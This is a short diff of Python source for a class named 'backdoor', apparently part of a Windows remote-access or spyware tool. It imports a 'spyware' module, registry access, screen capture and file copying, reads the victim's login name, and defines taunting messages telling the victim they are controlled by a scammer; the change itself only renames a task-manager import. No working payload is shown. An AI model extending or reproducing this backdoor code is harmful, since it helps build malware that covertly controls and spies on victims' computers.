@@ -9,13 +9,13 @@ import base64
 import spyware
 import subprocess
 from winreg import *
-import work_manager as wm
+import task_manager as tm
 from PIL import ImageGrab
 from shutil import copyfile
 
 class backdoor:
     try:
-        work_manager = wm.manager()
+        work_manager = tm.manager()
         current_username = spyware.spyware.current_user = os.getlogin()     #Static Variables
         
         hacked_msg_list = ["Brace yourself as pain is crawling towards you.", "{}, You are being controlled by an Indian Scammer!.".format(current_username)]
